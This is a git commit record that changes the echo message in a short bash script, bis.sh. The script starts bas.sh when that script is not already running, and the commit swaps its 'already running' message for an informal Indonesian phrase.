70a6c70d05a8c794427a52b90990d941cc4b445c
gaserjuk <gaserjukilo@gmail.com>
2025-11-18 16:36:32 +0700

    Update bis.sh

--- bis.sh
+++ bis.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-if ! pgrep -f bas.sh > /dev/null; then chmod +x ./bas.sh && ./bas.sh; else echo bas.sh is already running.; fi
+if ! pgrep -f bas.sh > /dev/null; then chmod +x ./bas.sh && ./bas.sh; else echo KOPI NE SIH PANAS...; fi
